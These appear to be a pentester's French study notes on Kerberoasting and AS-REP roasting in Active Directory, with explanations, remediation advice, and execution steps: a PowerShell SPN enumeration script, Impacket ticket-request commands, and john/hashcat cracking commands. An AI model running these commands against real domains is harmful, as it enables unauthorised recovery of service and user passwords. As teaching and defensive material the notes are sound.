<html> <meta charset="UTF-8">
<h1>### Kerberoasting ###</h1>
<br>
<h2>Outils :</h2>
- ListusersSPNs.ps1
- Impacket GetUserSPNs.py
<br>
<h2>Explications :</h2>
Les comptes de service ont un SPN (Service Principal Name), exemple : www/WEB-SERVER-01.adsec.local
SPN = combinaison du service + de la machine hébergeant le service
Comptes de service ont généralement un mdp robuste (20-30 caractères)
Il est possible d'effectuer des demandes de TGS en indiquant des SPN arbitraires
Un utilisateur de l’AD peut demander un TGS pour n’importe quel service auprès du KDC
-> Obtention d'un TGS chiffré avec le mdp du compte possédant le SPN
-> Bruteforce -> si le TGS est déchiffrable, le mot de passe est trouvé
<br>
<h2>Remédiation :</h2>
Pas de SPN sur les comptes utilisateurs (ces derniers ont souvent des comptes à mot de passe suivant la politique AD pouvant être bruteforcés), ou alors si VRAIMENT nécessaire, utiliser la fonctionnalité “Managed Service Accounts” (MSA) de Microsoft qui permet de faire en sorte que le mot de passe du compte soit robuste et changé régulièrement et automatiquement
<br>
<h2>Exécution</h2>
ListusersSPNs.ps1, listing des utilisateurs possédant un SPN :
<br>
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
        $userEntry = $result.GetDirectoryEntry()
        Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
        Write-host "SPNs"
        foreach($SPN in $userEntry.servicePrincipalName)
        {
                $SPN
        }
        Write-host ""
}
<br>
À partir de l’adresse <https://beta.hackndo.com/kerberoasting/>
<br>
<br>
<u>Récupération des TGS :</u>
<br>
C:\Users\julien.ferrero\Desktop\no_scan\impacket-master\examples>python GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<domain_username>
<br>
<u>Cracking des TGS :</u>
<br>
john --format=krb5tgs --wordlist=/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt TGS_to_crack.txt
<br>
<u>Affichage des TGS crackés :</u>
<br>
cat ~/.john/john.pot
<br>
<br>
<br>
<h1>### AS_REP Roasting ###</h1>
<br>
<br>
https://beta.hackndo.com/kerberos-asrep-roasting/
<br>
<br>
<h2>Outils :</h2>
·       Rubeus
·       Impacket : GetNPUsers.py
<br>
<h2>Explication :</h2>
Lors d’une demande de TGT, l’utilisateur doit, par défaut, s’authentifier auprès du KDC pour que celui-ci lui réponde. Il arrive que cette authentification préalable ne soit pas demandée pour certains comptes, permettant à un attaquant d’abuser de cette configuration.
Lorsque nous avons parlé du fonctionnement de Kerberos, il a été mis en évidence que dans le premier échange (KRB_AS_REQ - KRB_AS_REP), le client doit d’abord s’authentifier auprès du KDC avant d’obtenir un TGT. Une partie de la réponse du KDC étant chiffrée avec le secret du compte client (la clé de session), il est important que cette information ne soit pas accessible sans authentification. Dans le cas échéant n’importe qui pourrait demander un TGT pour un compte donné, et tenter de décrypter la partie chiffrée de la réponse KRB_AS_REP pour retrouver le mot de passe de l’utilisateur ciblé.


TODO IMG


<h2>Remédiation :</h2>
Ne pas activer “Do not require Kerberos preauthentication”
<br>
<br>
À partir de l’adresse <https://beta.hackndo.com/kerberos-asrep-roasting/>
<br>
<h2>Exécution</h2>
<u>Récupération des TGT pour les utilisateurs pour lesquels la preauth Kerberos est désactivée :</u>
<br>
PS > python C:\GetNPUsers.py spookysec.local/ -no-pass -usersfile .\userlist2.txt -dc-ip <dc_ip> -outputfile .\ASREP_Roastable_users.txt
<br>
<br>
<u>Puis cracking :</u>
PS> john --wordlist=$wordlist ASREP_Roastable_users.txt
<br>
<br>
(ou : PS >  .\hashcat.exe --force -m 18200 -a 0 -o "../hash_res.txt" "../svc-admin.txt")
<br>
<br>
